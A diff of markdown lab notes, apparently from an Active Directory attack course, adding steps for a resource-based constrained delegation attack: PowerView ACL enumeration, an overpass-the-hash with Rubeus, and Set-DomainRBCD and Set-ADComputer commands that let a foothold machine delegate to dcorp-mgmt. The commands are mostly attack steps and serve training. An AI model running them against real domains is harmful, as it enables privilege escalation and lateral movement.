@@ -1,9 +1,11 @@
 **Local admin privileges to the foothold/attacker machine are required due to the need of a machine hash**
 
-Find that a compromised user has `Write` permissions over a machine (PowerView)
+Find that a compromised user has `Write` permissions over a machine (PowerView) 
 ```powershell
 Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
 ```
+
+We see that `ciadmin` has `GenericWrite` over `dcorp-mgmt`
 
 Shell as user with `Write` permissions - `ciadmin` - OPtH
 ```powershell
@@ -12,10 +14,15 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:ciadmin /
 
 As `ciadmin`, add your foothold machine that you have local admin privileges to  the`PrincipalsAllowedToDelegateToAccount` (PowerView + AD Module)
 ```powershell
-Set-DomainRBCD -Identity dcorpmgmt
+Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student548$' -Verbose
 
 $comps = 'dcorp-student548$'
 Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
+```
+
+Confirm RBCD configuration
+```powershell
+Get-DomainRBCD
 ```
 
 Obtain foothold/attacker machine machine hash (`dcorp-student548$`)
